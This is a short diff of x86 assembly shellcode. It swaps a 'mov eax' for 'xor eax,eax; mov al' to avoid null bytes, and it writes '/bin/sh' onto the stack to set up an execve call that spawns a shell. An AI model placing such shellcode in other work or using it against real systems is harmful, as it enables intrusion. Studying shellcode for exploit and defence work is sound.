@@ -1,5 +1,6 @@
 # eax = sys_execve
-mov eax, __NR_SYS_execve
+xor eax,eax
+mov al, __NR_SYS_execve
 # write /bin/sh @esp
 mov dword ptr [esp], "nib/"
 mov dword ptr [esp+4], "hs//"
